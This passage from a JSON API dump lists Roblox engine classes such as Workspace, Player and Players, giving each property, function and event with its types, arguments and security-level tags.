tags":[]},{"ValueType":"bool","type":"Property","Name":"AllowThirdPartySales","tags":[],"Class":"Workspace"},{"ValueType":"Object","type":"Property","Name":"CurrentCamera","tags":[],"Class":"Workspace"},{"ValueType":"double","type":"Property","Name":"DistributedGameTime","tags":[],"Class":"Workspace"},{"ValueType":"bool","type":"Property","Name":"FilteringEnabled","tags":[],"Class":"Workspace"},{"ValueType":"float","type":"Property","Name":"Gravity","tags":[],"Class":"Workspace"},{"ValueType":"bool","type":"Property","Name":"StreamingEnabled","tags":[],"Class":"Workspace"},{"ValueType":"Object","type":"Property","Name":"Terrain","tags":["readonly"],"Class":"Workspace"},{"ReturnType":"void","Arguments":[{"Type":"Objects","Name":"objects","Default":null}],"Name":"BreakJoints","tags":["PluginSecurity"],"Class":"Workspace","type":"Function"},{"ReturnType":"bool","Arguments":[],"Name":"ExperimentalSolverIsEnabled","tags":["LocalUserSecurity"],"Class":"Workspace","type":"Function"},{"ReturnType":"Tuple","Arguments":[{"Type":"Ray","Name":"ray","Default":null},{"Type":"Instance","Name":"ignoreDescendentsInstance","Default":"nil"},{"Type":"bool","Name":"terrainCellsAreCubes","Default":"false"},{"Type":"bool","Name":"ignoreWater","Default":"false"}],"Name":"FindPartOnRay","tags":[],"Class":"Workspace","type":"Function"},{"ReturnType":"Tuple","Arguments":[{"Type":"Ray","Name":"ray","Default":null},{"Type":"Objects","Name":"ignoreDescendentsTable","Default":null},{"Type":"bool","Name":"terrainCellsAreCubes","Default":"false"},{"Type":"bool","Name":"ignoreWater","Default":"false"}],"Name":"FindPartOnRayWithIgnoreList","tags":[],"Class":"Workspace","type":"Function"},{"ReturnType":"Objects","Arguments":[{"Type":"Region3","Name":"region","Default":null},{"Type":"Instance","Name":"ignoreDescendentsInstance","Default":"nil"},{"Type":"int","Name":"maxParts","Default":"20"}],"Name":"FindPartsInRegion3","tags":[],"Class":"Workspace","type":"Function"},{"ReturnType":"Objects","Arguments":[{"Type":"Region3","Name":"region","Default":null},{"Type":"Objects","Name":"ignoreDescendentsTable","Default":null},{"Type":"int","Name":"maxParts","Default":"20"}],"Name":"FindPartsInRegion3WithIgnoreList","tags":[],"Class":"Workspace","type":"Function"},{"ReturnType":"int","Arguments":[],"Name":"GetNumAwakeParts","tags":[],"Class":"Workspace","type":"Function"},{"ReturnType":"bool","Arguments":[],"Name":"GetPhysicsAnalyzerBreakOnIssue","tags":["PluginSecurity"],"Class":"Workspace","type":"Function"},{"ReturnType":"Objects","Arguments":[{"Type":"int","Name":"index","Default":null}],"Name":"GetPhysicsAnalyzerIssue","tags":["PluginSecurity"],"Class":"Workspace","type":"Function"},{"ReturnType":"int","Arguments":[],"Name":"GetPhysicsThrottling","tags":[],"Class":"Workspace","type":"Function"},{"ReturnType":"double","Arguments":[],"Name":"GetRealPhysicsFPS","tags":[],"Class":"Workspace","type":"Function"},{"ReturnType":"bool","Arguments":[{"Type":"Region3","Name":"region","Default":null},{"Type":"Instance","Name":"ignoreDescendentsInstance","Default":"nil"}],"Name":"IsRegion3Empty","tags":[],"Class":"Workspace","type":"Function"},{"ReturnType":"bool","Arguments":[{"Type":"Region3","Name":"region","Default":null},{"Type":"Objects","Name":"ignoreDescendentsTable","Default":null}],"Name":"IsRegion3EmptyWithIgnoreList","tags":[],"Class":"Workspace","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"Objects","Name":"objects","Default":null},{"Type":"JointCreationMode","Name":"jointType","Default":null}],"Name":"JoinToOutsiders","tags":[],"Class":"Workspace","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"Objects","Name":"objects","Default":null}],"Name":"MakeJoints","tags":["PluginSecurity"],"Class":"Workspace","type":"Function"},{"ReturnType":"bool","Arguments":[],"Name":"PGSIsEnabled","tags":[],"Class":"Workspace","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"bool","Name":"enable","Default":null}],"Name":"SetPhysicsAnalyzerBreakOnIssue","tags":["PluginSecurity"],"Class":"Workspace","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"bool","Name":"value","Default":null}],"Name":"SetPhysicsThrottleEnabled","tags":["LocalUserSecurity"],"Class":"Workspace","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"Objects","Name":"objects","Default":null}],"Name":"UnjoinFromOutsiders","tags":[],"Class":"Workspace","type":"Function"},{"ReturnType":"void","Arguments":[],"Name":"ZoomToExtents","tags":["PluginSecurity"],"Class":"Workspace","type":"Function"},{"ReturnType":"Tuple","Arguments":[{"Type":"Ray","Name":"ray","Default":null},{"Type":"Instance","Name":"ignoreDescendentsInstance","Default":"nil"},{"Type":"bool","Name":"terrainCellsAreCubes","Default":"false"},{"Type":"bool","Name":"ignoreWater","Default":"false"}],"Name":"findPartOnRay","tags":["deprecated"],"Class":"Workspace","type":"Function"},{"ReturnType":"Objects","Arguments":[{"Type":"Region3","Name":"region","Default":null},{"Type":"Instance","Name":"ignoreDescendentsInstance","Default":"nil"},{"Type":"int","Name":"maxParts","Default":"20"}],"Name":"findPartsInRegion3","tags":["deprecated"],"Class":"Workspace","type":"Function"},{"Arguments":[{"Name":"count","Type":"int"}],"Name":"PhysicsAnalyzerIssuesFound","tags":["PluginSecurity"],"Class":"Workspace","type":"Event"},{"Superclass":"Model","type":"Class","Name":"Status","tags":["deprecated","notCreatable"]},{"Superclass":"Instance","type":"Class","Name":"Pages","tags":[]},{"ValueType":"bool","type":"Property","Name":"IsFinished","tags":["readonly"],"Class":"Pages"},{"ReturnType":"Array","Arguments":[],"Name":"GetCurrentPage","tags":[],"Class":"Pages","type":"Function"},{"ReturnType":"void","Arguments":[],"Name":"AdvanceToNextPageAsync","tags":[],"Class":"Pages","type":"YieldFunction"},{"Superclass":"Pages","type":"Class","Name":"DataStorePages","tags":[]},{"Superclass":"Pages","type":"Class","Name":"FriendPages","tags":[]},{"Superclass":"Pages","type":"Class","Name":"StandardPages","tags":[]},{"Superclass":"Instance","type":"Class","Name":"PartOperationAsset","tags":[]},{"Superclass":"Instance","type":"Class","Name":"ParticleEmitter","tags":[]},{"ValueType":"Vector3","type":"Property","Name":"Acceleration","tags":[],"Class":"ParticleEmitter"},{"ValueType":"ColorSequence","type":"Property","Name":"Color","tags":[],"Class":"ParticleEmitter"},{"ValueType":"float","type":"Property","Name":"Drag","tags":[],"Class":"ParticleEmitter"},{"ValueType":"NormalId","type":"Property","Name":"EmissionDirection","tags":[],"Class":"ParticleEmitter"},{"ValueType":"bool","type":"Property","Name":"Enabled","tags":[],"Class":"ParticleEmitter"},{"ValueType":"NumberRange","type":"Property","Name":"Lifetime","tags":[],"Class":"ParticleEmitter"},{"ValueType":"float","type":"Property","Name":"LightEmission","tags":[],"Class":"ParticleEmitter"},{"ValueType":"bool","type":"Property","Name":"LockedToPart","tags":[],"Class":"ParticleEmitter"},{"ValueType":"float","type":"Property","Name":"Rate","tags":[],"Class":"ParticleEmitter"},{"ValueType":"NumberRange","type":"Property","Name":"RotSpeed","tags":[],"Class":"ParticleEmitter"},{"ValueType":"NumberRange","type":"Property","Name":"Rotation","tags":[],"Class":"ParticleEmitter"},{"ValueType":"NumberSequence","type":"Property","Name":"Size","tags":[],"Class":"ParticleEmitter"},{"ValueType":"NumberRange","type":"Property","Name":"Speed","tags":[],"Class":"ParticleEmitter"},{"ValueType":"Content","type":"Property","Name":"Texture","tags":[],"Class":"ParticleEmitter"},{"ValueType":"NumberSequence","type":"Property","Name":"Transparency","tags":[],"Class":"ParticleEmitter"},{"ValueType":"float","type":"Property","Name":"VelocityInheritance","tags":[],"Class":"ParticleEmitter"},{"ValueType":"float","type":"Property","Name":"VelocitySpread","tags":[],"Class":"ParticleEmitter"},{"ValueType":"float","type":"Property","Name":"ZOffset","tags":[],"Class":"ParticleEmitter"},{"ReturnType":"void","Arguments":[{"Type":"int","Name":"particleCount","Default":"16"}],"Name":"Emit","tags":[],"Class":"ParticleEmitter","type":"Function"},{"Superclass":"Instance","type":"Class","Name":"Path","tags":[]},{"ValueType":"PathStatus","type":"Property","Name":"Status","tags":["readonly"],"Class":"Path"},{"ReturnType":"Array","Arguments":[],"Name":"GetPointCoordinates","tags":[],"Class":"Path","type":"Function"},{"ReturnType":"int","Arguments":[{"Type":"int","Name":"start","Default":null}],"Name":"CheckOcclusionAsync","tags":[],"Class":"Path","type":"YieldFunction"},{"Superclass":"Instance","type":"Class","Name":"PathfindingService","tags":["notCreatable"]},{"ValueType":"float","type":"Property","Name":"EmptyCutoff","tags":[],"Class":"PathfindingService"},{"ReturnType":"Instance","Arguments":[{"Type":"Vector3","Name":"start","Default":null},{"Type":"Vector3","Name":"finish","Default":null},{"Type":"float","Name":"maxDistance","Default":null}],"Name":"ComputeRawPathAsync","tags":[],"Class":"PathfindingService","type":"YieldFunction"},{"ReturnType":"Instance","Arguments":[{"Type":"Vector3","Name":"start","Default":null},{"Type":"Vector3","Name":"finish","Default":null},{"Type":"float","Name":"maxDistance","Default":null}],"Name":"ComputeSmoothPathAsync","tags":[],"Class":"PathfindingService","type":"YieldFunction"},{"Superclass":"Instance","type":"Class","Name":"PersonalServerService","tags":[]},{"ValueType":"string","type":"Property","Name":"RoleSets","tags":["RobloxScriptSecurity"],"Class":"PersonalServerService"},{"ReturnType":"void","Arguments":[{"Type":"Instance","Name":"player","Default":null}],"Name":"Demote","tags":["RobloxScriptSecurity"],"Class":"PersonalServerService","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"Instance","Name":"player","Default":null}],"Name":"Promote","tags":["RobloxScriptSecurity"],"Class":"PersonalServerService","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"personalServerGetRankUrl","Default":null}],"Name":"SetPersonalServerGetRankUrl","tags":["LocalUserSecurity"],"Class":"PersonalServerService","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"personalServerRoleSetsUrl","Default":null}],"Name":"SetPersonalServerRoleSetsUrl","tags":["LocalUserSecurity"],"Class":"PersonalServerService","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"personalServerSetRankUrl","Default":null}],"Name":"SetPersonalServerSetRankUrl","tags":["LocalUserSecurity"],"Class":"PersonalServerService","type":"Function"},{"ReturnType":"string","Arguments":[{"Type":"int","Name":"placeId","Default":null}],"Name":"GetRoleSets","tags":["RobloxScriptSecurity"],"Class":"PersonalServerService","type":"YieldFunction"},{"Superclass":"Instance","type":"Class","Name":"PhysicsPacketCache","tags":[]},{"Superclass":"Instance","type":"Class","Name":"PhysicsService","tags":[]},{"Superclass":"Instance","type":"Class","Name":"PhysicsSettings","tags":[]},{"ValueType":"bool","type":"Property","Name":"AllowSleep","tags":[],"Class":"PhysicsSettings"},{"ValueType":"bool","type":"Property","Name":"AreAnchorsShown","tags":[],"Class":"PhysicsSettings"},{"ValueType":"bool","type":"Property","Name":"AreAssembliesShown","tags":[],"Class":"PhysicsSettings"},{"ValueType":"bool","type":"Property","Name":"AreAttachmentsShown","tags":[],"Class":"PhysicsSettings"},{"ValueType":"bool","type":"Property","Name":"AreAwakePartsHighlighted","tags":[],"Class":"PhysicsSettings"},{"ValueType":"bool","type":"Property","Name":"AreBodyTypesShown","tags":[],"Class":"PhysicsSettings"},{"ValueType":"bool","type":"Property","Name":"AreConstraintsShown","tags":[],"Class":"PhysicsSettings"},{"ValueType":"bool","type":"Property","Name":"AreContactPointsShown","tags":[],"Class":"PhysicsSettings"},{"ValueType":"bool","type":"Property","Name":"AreJointCoordinatesShown","tags":[],"Class":"PhysicsSettings"},{"ValueType":"bool","type":"Property","Name":"AreMechanismsShown","tags":[],"Class":"PhysicsSettings"},{"ValueType":"bool","type":"Property","Name":"AreModelCoordsShown","tags":[],"Class":"PhysicsSettings"},{"ValueType":"bool","type":"Property","Name":"AreOwnersShown","tags":[],"Class":"PhysicsSettings"},{"ValueType":"bool","type":"Property","Name":"ArePartCoordsShown","tags":[],"Class":"PhysicsSettings"},{"ValueType":"bool","type":"Property","Name":"AreRegionsShown","tags":[],"Class":"PhysicsSettings"},{"ValueType":"bool","type":"Property","Name":"AreUnalignedPartsShown","tags":[],"Class":"PhysicsSettings"},{"ValueType":"bool","type":"Property","Name":"AreWorldCoordsShown","tags":[],"Class":"PhysicsSettings"},{"ValueType":"bool","type":"Property","Name":"IsReceiveAgeShown","tags":[],"Class":"PhysicsSettings"},{"ValueType":"bool","type":"Property","Name":"IsTreeShown","tags":[],"Class":"PhysicsSettings"},{"ValueType":"bool","type":"Property","Name":"ParallelPhysics","tags":[],"Class":"PhysicsSettings"},{"ValueType":"bool","type":"Property","Name":"PhysicsAnalyzerEnabled","tags":["PluginSecurity","readonly"],"Class":"PhysicsSettings"},{"ValueType":"EnviromentalPhysicsThrottle","type":"Property","Name":"PhysicsEnvironmentalThrottle","tags":[],"Class":"PhysicsSettings"},{"ValueType":"bool","type":"Property","Name":"ShowDecompositionGeometry","tags":[],"Class":"PhysicsSettings"},{"ValueType":"double","type":"Property","Name":"ThrottleAdjustTime","tags":[],"Class":"PhysicsSettings"},{"Superclass":"Instance","type":"Class","Name":"Player","tags":[]},{"ValueType":"int","type":"Property","Name":"AccountAge","tags":["readonly"],"Class":"Player"},{"ValueType":"bool","type":"Property","Name":"AppearanceDidLoad","tags":["RobloxScriptSecurity","deprecated","readonly"],"Class":"Player"},{"ValueType":"bool","type":"Property","Name":"AutoJumpEnabled","tags":[],"Class":"Player"},{"ValueType":"float","type":"Property","Name":"CameraMaxZoomDistance","tags":[],"Class":"Player"},{"ValueType":"float","type":"Property","Name":"CameraMinZoomDistance","tags":[],"Class":"Player"},{"ValueType":"CameraMode","type":"Property","Name":"CameraMode","tags":[],"Class":"Player"},{"ValueType":"bool","type":"Property","Name":"CanLoadCharacterAppearance","tags":[],"Class":"Player"},{"ValueType":"Object","type":"Property","Name":"Character","tags":[],"Class":"Player"},{"ValueType":"string","type":"Property","Name":"CharacterAppearance","tags":["notbrowsable"],"Class":"Player"},{"ValueType":"ChatMode","type":"Property","Name":"ChatMode","tags":["RobloxScriptSecurity","readonly"],"Class":"Player"},{"ValueType":"int","type":"Property","Name":"DataComplexity","tags":["readonly"],"Class":"Player"},{"ValueType":"int","type":"Property","Name":"DataComplexityLimit","tags":["LocalUserSecurity"],"Class":"Player"},{"ValueType":"bool","type":"Property","Name":"DataReady","tags":["readonly"],"Class":"Player"},{"ValueType":"DevCameraOcclusionMode","type":"Property","Name":"DevCameraOcclusionMode","tags":[],"Class":"Player"},{"ValueType":"DevComputerCameraMovementMode","type":"Property","Name":"DevComputerCameraMode","tags":[],"Class":"Player"},{"ValueType":"DevComputerMovementMode","type":"Property","Name":"DevComputerMovementMode","tags":[],"Class":"Player"},{"ValueType":"bool","type":"Property","Name":"DevEnableMouseLock","tags":[],"Class":"Player"},{"ValueType":"DevTouchCameraMovementMode","type":"Property","Name":"DevTouchCameraMode","tags":[],"Class":"Player"},{"ValueType":"DevTouchMovementMode","type":"Property","Name":"DevTouchMovementMode","tags":[],"Class":"Player"},{"ValueType":"int","type":"Property","Name":"FollowUserId","tags":["readonly"],"Class":"Player"},{"ValueType":"bool","type":"Property","Name":"Guest","tags":["RobloxScriptSecurity","readonly"],"Class":"Player"},{"ValueType":"bool","type":"Property","Name":"HasBuildTools","tags":["RobloxScriptSecurity"],"Class":"Player"},{"ValueType":"float","type":"Property","Name":"HealthDisplayDistance","tags":[],"Class":"Player"},{"ValueType":"float","type":"Property","Name":"MaximumSimulationRadius","tags":["LocalUserSecurity"],"Class":"Player"},{"ValueType":"MembershipType","type":"Property","Name":"MembershipType","tags":["readonly"],"Class":"Player"},{"ValueType":"float","type":"Property","Name":"NameDisplayDistance","tags":[],"Class":"Player"},{"ValueType":"bool","type":"Property","Name":"Neutral","tags":[],"Class":"Player"},{"ValueType":"int","type":"Property","Name":"PersonalServerRank","tags":["RobloxScriptSecurity"],"Class":"Player"},{"ValueType":"Object","type":"Property","Name":"RespawnLocation","tags":[],"Class":"Player"},{"ValueType":"float","type":"Property","Name":"SimulationRadius","tags":["LocalUserSecurity"],"Class":"Player"},{"ValueType":"BrickColor","type":"Property","Name":"TeamColor","tags":[],"Class":"Player"},{"ValueType":"bool","type":"Property","Name":"Teleported","tags":["RobloxScriptSecurity","hidden","readonly"],"Class":"Player"},{"ValueType":"bool","type":"Property","Name":"TeleportedIn","tags":["RobloxScriptSecurity"],"Class":"Player"},{"ValueType":"int","type":"Property","Name":"UserId","tags":[],"Class":"Player"},{"ValueType":"string","type":"Property","Name":"VRDevice","tags":["RobloxScriptSecurity"],"Class":"Player"},{"ValueType":"int","type":"Property","Name":"userId","tags":["deprecated"],"Class":"Player"},{"ReturnType":"void","Arguments":[],"Name":"ClearCharacterAppearance","tags":[],"Class":"Player","type":"Function"},{"ReturnType":"float","Arguments":[{"Type":"Vector3","Name":"point","Default":null}],"Name":"DistanceFromCharacter","tags":[],"Class":"Player","type":"Function"},{"ReturnType":"FriendStatus","Arguments":[{"Type":"Instance","Name":"player","Default":null}],"Name":"GetFriendStatus","tags":["RobloxScriptSecurity"],"Class":"Player","type":"Function"},{"ReturnType":"string","Arguments":[],"Name":"GetGameSessionID","tags":["RobloxSecurity"],"Class":"Player","type":"Function"},{"ReturnType":"Instance","Arguments":[],"Name":"GetMouse","tags":[],"Class":"Player","type":"Function"},{"ReturnType":"bool","Arguments":[],"Name":"GetUnder13","tags":["RobloxScriptSecurity"],"Class":"Player","type":"Function"},{"ReturnType":"bool","Arguments":[],"Name":"HasAppearanceLoaded","tags":[],"Class":"Player","type":"Function"},{"ReturnType":"void","Arguments":[],"Name":"JumpCharacter","tags":["RobloxScriptSecurity"],"Class":"Player","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"message","Default":""}],"Name":"Kick","tags":[],"Class":"Player","type":"Function"},{"ReturnType":"bool","Arguments":[{"Type":"string","Name":"key","Default":null}],"Name":"LoadBoolean","tags":[],"Class":"Player","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"bool","Name":"inGame","Default":"true"}],"Name":"LoadCharacter","tags":[],"Class":"Player","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"Instance","Name":"assetInstance","Default":null}],"Name":"LoadCharacterAppearance","tags":[],"Class":"Player","type":"Function"},{"ReturnType":"void","Arguments":[],"Name":"LoadData","tags":["LocalUserSecurity"],"Class":"Player","type":"Function"},{"ReturnType":"Instance","Arguments":[{"Type":"string","Name":"key","Default":null}],"Name":"LoadInstance","tags":[],"Class":"Player","type":"Function"},{"ReturnType":"double","Arguments":[{"Type":"string","Name":"key","Default":null}],"Name":"LoadNumber","tags":[],"Class":"Player","type":"Function"},{"ReturnType":"string","Arguments":[{"Type":"string","Name":"key","Default":null}],"Name":"LoadString","tags":[],"Class":"Player","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"Vector3","Name":"walkDirection","Default":null},{"Type":"bool","Name":"relativeToCamera","Default":"false"}],"Name":"Move","tags":[],"Class":"Player","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"Vector2","Name":"walkDirection","Default":null},{"Type":"float","Name":"maxWalkDelta","Default":null}],"Name":"MoveCharacter","tags":["RobloxScriptSecurity"],"Class":"Player","type":"Function"},{"ReturnType":"void","Arguments":[],"Name":"RemoveCharacter","tags":["LocalUserSecurity"],"Class":"Player","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"Instance","Name":"player","Default":null}],"Name":"RequestFriendship","tags":["RobloxScriptSecurity"],"Class":"Player","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"Instance","Name":"player","Default":null}],"Name":"RevokeFriendship","tags":["RobloxScriptSecurity"],"Class":"Player","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"key","Default":null},{"Type":"bool","Name":"value","Default":null}],"Name":"SaveBoolean","tags":[],"Class":"Player","type":"Function"},{"ReturnType":"void","Arguments":[],"Name":"SaveData","tags":["LocalUserSecurity"],"Class":"Player","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"key","Default":null},{"Type":"Instance","Name":"value","Default":null}],"Name":"SaveInstance","tags":[],"Class":"Player","type":"Function"},{"ReturnType":"void","Arguments":[],"Name":"SaveLeaderboardData","tags":["LocalUserSecurity"],"Class":"Player","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"key","Default":null},{"Type":"double","Name":"value","Default":null}],"Name":"SaveNumber","tags":[],"Class":"Player","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"key","Default":null},{"Type":"string","Name":"value","Default":null}],"Name":"SaveString","tags":[],"Class":"Player","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"int","Name":"accountAge","Default":null}],"Name":"SetAccountAge","tags":["PluginSecurity"],"Class":"Player","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"MembershipType","Name":"membershipType","Default":null}],"Name":"SetMembershipType","tags":["RobloxScriptSecurity"],"Class":"Player","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"bool","Name":"value","Default":null}],"Name":"SetSuperSafeChat","tags":["PluginSecurity"],"Class":"Player","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"bool","Name":"value","Default":null}],"Name":"SetUnder13","tags":["RobloxSecurity","deprecated"],"Class":"Player","type":"Function"},{"ReturnType":"bool","Arguments":[{"Type":"string","Name":"key","Default":null}],"Name":"loadBoolean","tags":["deprecated"],"Class":"Player","type":"Function"},{"ReturnType":"Instance","Arguments":[{"Type":"string","Name":"key","Default":null}],"Name":"loadInstance","tags":["deprecated"],"Class":"Player","type":"Function"},{"ReturnType":"double","Arguments":[{"Type":"string","Name":"key","Default":null}],"Name":"loadNumber","tags":["deprecated"],"Class":"Player","type":"Function"},{"ReturnType":"string","Arguments":[{"Type":"string","Name":"key","Default":null}],"Name":"loadString","tags":["deprecated"],"Class":"Player","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"key","Default":null},{"Type":"bool","Name":"value","Default":null}],"Name":"saveBoolean","tags":["deprecated"],"Class":"Player","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"key","Default":null},{"Type":"Instance","Name":"value","Default":null}],"Name":"saveInstance","tags":["deprecated"],"Class":"Player","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"key","Default":null},{"Type":"double","Name":"value","Default":null}],"Name":"saveNumber","tags":["deprecated"],"Class":"Player","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"key","Default":null},{"Type":"string","Name":"value","Default":null}],"Name":"saveString","tags":["deprecated"],"Class":"Player","type":"Function"},{"ReturnType":"Array","Arguments":[{"Type":"int","Name":"maxFriends","Default":"200"}],"Name":"GetFriendsOnline","tags":[],"Class":"Player","type":"YieldFunction"},{"ReturnType":"int","Arguments":[{"Type":"int","Name":"groupId","Default":null}],"Name":"GetRankInGroup","tags":[],"Class":"Player","type":"YieldFunction"},{"ReturnType":"string","Arguments":[{"Type":"int","Name":"groupId","Default":null}],"Name":"GetRoleInGroup","tags":[],"Class":"Player","type":"YieldFunction"},{"ReturnType":"string","Arguments":[],"Name":"GetWebPersonalServerRank","tags":["LocalUserSecurity","backend"],"Class":"Player","type":"YieldFunction"},{"ReturnType":"bool","Arguments":[{"Type":"int","Name":"userId","Default":null}],"Name":"IsBestFriendsWith","tags":["deprecated"],"Class":"Player","type":"YieldFunction"},{"ReturnType":"bool","Arguments":[{"Type":"int","Name":"userId","Default":null}],"Name":"IsFriendsWith","tags":[],"Class":"Player","type":"YieldFunction"},{"ReturnType":"bool","Arguments":[{"Type":"int","Name":"groupId","Default":null}],"Name":"IsInGroup","tags":[],"Class":"Player","type":"YieldFunction"},{"ReturnType":"bool","Arguments":[{"Type":"int","Name":"rank","Default":null}],"Name":"SetWebPersonalServerRank","tags":["WritePlayerSecurity"],"Class":"Player","type":"YieldFunction"},{"ReturnType":"bool","Arguments":[],"Name":"WaitForDataReady","tags":[],"Class":"Player","type":"YieldFunction"},{"ReturnType":"bool","Arguments":[{"Type":"int","Name":"userId","Default":null}],"Name":"isFriendsWith","tags":["deprecated"],"Class":"Player","type":"YieldFunction"},{"ReturnType":"bool","Arguments":[],"Name":"waitForDataReady","tags":["deprecated"],"Class":"Player","type":"YieldFunction"},{"Arguments":[{"Name":"character","Type":"Instance"}],"Name":"CharacterAdded","tags":[],"Class":"Player","type":"Event"},{"Arguments":[{"Name":"character","Type":"Instance"}],"Name":"CharacterAppearanceLoaded","tags":[],"Class":"Player","type":"Event"},{"Arguments":[{"Name":"character","Type":"Instance"}],"Name":"CharacterRemoving","tags":[],"Class":"Player","type":"Event"},{"Arguments":[{"Name":"message","Type":"string"},{"Name":"recipient","Type":"Instance"}],"Name":"Chatted","tags":[],"Class":"Player","type":"Event"},{"Arguments":[{"Name":"player","Type":"Instance"},{"Name":"friendStatus","Type":"FriendStatus"}],"Name":"FriendStatusChanged","tags":["RobloxScriptSecurity"],"Class":"Player","type":"Event"},{"Arguments":[{"Name":"time","Type":"double"}],"Name":"Idled","tags":[],"Class":"Player","type":"Event"},{"Arguments":[{"Name":"teleportState","Type":"TeleportState"},{"Name":"placeId","Type":"int"},{"Name":"spawnName","Type":"string"}],"Name":"OnTeleport","tags":[],"Class":"Player","type":"Event"},{"Arguments":[{"Name":"radius","Type":"float"}],"Name":"SimulationRadiusChanged","tags":["LocalUserSecurity"],"Class":"Player","type":"Event"},{"Superclass":"Instance","type":"Class","Name":"PlayerScripts","tags":["notCreatable"]},{"Superclass":"Instance","type":"Class","Name":"Players","tags":[]},{"ValueType":"bool","type":"Property","Name":"BubbleChat","tags":["readonly"],"Class":"Players"},{"ValueType":"bool","type":"Property","Name":"CharacterAutoLoads","tags":[],"Class":"Players"},{"ValueType":"bool","type":"Property","Name":"ClassicChat","tags":["readonly"],"Class":"Players"},{"ValueType":"Object","type":"Property","Name":"LocalPlayer","tags":["readonly"],"Class":"Players"},{"ValueType":"int","type":"Property","Name":"MaxPlayers","tags":["readonly"],"Class":"Players"},{"ValueType":"int","type":"Property","Name":"MaxPlayersInternal","tags":["LocalUserSecurity"],"Class":"Players"},{"ValueType":"int","type":"Property","Name":"NumPlayers","tags":["readonly"],"Class":"Players"},{"ValueType":"int","type":"Property","Name":"PreferredPlayers","tags":["readonly"],"Class":"Players"},{"ValueType":"int","type":"Property","Name":"PreferredPlayersInternal","tags":["LocalUserSecurity"],"Class":"Players"},{"ValueType":"Object","type":"Property","Name":"localPlayer","tags":["deprecated","hidden","readonly"],"Class":"Players"},{"ValueType":"int","type":"Property","Name":"numPlayers","tags":["deprecated","hidden","readonly"],"Class":"Players"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"key","Default":null}],"Name":"AddLeaderboardKey","tags":["LocalUserSecurity"],"Class":"Players","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"message","Default":null}],"Name":"Chat","tags":["PluginSecurity"],"Class":"Players","type":"Function"},{"ReturnType":"Instance","Arguments":[{"Type":"int","Name":"userId","Default":null},{"Type":"bool","Name":"isTeleport","Default":"false"}],"Name":"CreateLocalPlayer","tags":["PluginSecurity"],"Class":"Players","type":"Function"},{"ReturnType":"Instance","Arguments":[{"Type":"int","Name":"userID","Default":null}],"Name":"GetPlayerByID","tags":["LocalUserSecurity","deprecated"],"Class":"Players","type":"Function"},{"ReturnType":"Instance","Arguments":[{"Type":"int","Name":"userId","Default":null}],"Name":"GetPlayerById","tags":["LocalUserSecurity"],"Class":"Players","type":"Function"},{"ReturnType":"Instance","Arguments":[{"Type":"int","Name":"userId","Default":null}],"Name":"GetPlayerByUserId","tags":[],"Class":"Players","type":"Function"},{"ReturnType":"Instance","Arguments":[{"Type":"Instance","Name":"character","Default":null}],"Name":"GetPlayerFromCharacter","tags":[],"Class":"Players","type":"Function"},{"ReturnType":"Objects","Arguments":[],"Name":"GetPlayers","tags":[],"Class":"Players","type":"Function"},{"ReturnType":"bool","Arguments":[],"Name":"GetUseCoreScriptHealthBar","tags":["RobloxScriptSecurity"],"Class":"Players","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"Instance","Name":"player","Default":null},{"Type":"string","Name":"reason","Default":null},{"Type":"string","Name":"optionalMessage","Default":null}],"Name":"ReportAbuse","tags":["LocalUserSecurity"],"Class":"Players","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"url","Default":null}],"Name":"SetAbuseReportUrl","tags":["RobloxSecurity"],"Class":"Players","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"url","Default":null}],"Name":"SetBuildUserPermissionsUrl","tags":["RobloxSecurity"],"Class":"Players","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"url","Default":null}],"Name":"SetChatFilterUrl","tags":["RobloxSecurity"],"Class":"Players","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"ChatStyle","Name":"style","Default":"Classic"}],"Name":"SetChatStyle","tags":["PluginSecurity"],"Class":"Players","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"url","Default":null}],"Name":"SetLoadDataUrl","tags":["LocalUserSecurity"],"Class":"Players","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"url","Default":null}],"Name":"SetSaveDataUrl","tags":["LocalUserSecurity"],"Class":"Players","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"url","Default":null}],"Name":"SetSaveLeaderboardDataUrl","tags":["LocalUserSecurity"],"Class":"Players","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"url","Default":null}],"Name":"SetSysStatsUrl","tags":["LocalUserSecurity"],"Class":"Players","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"urlId","Default":null}],"Name":"SetSysStatsUrlId","tags":["LocalUserSecurity"],"Class":"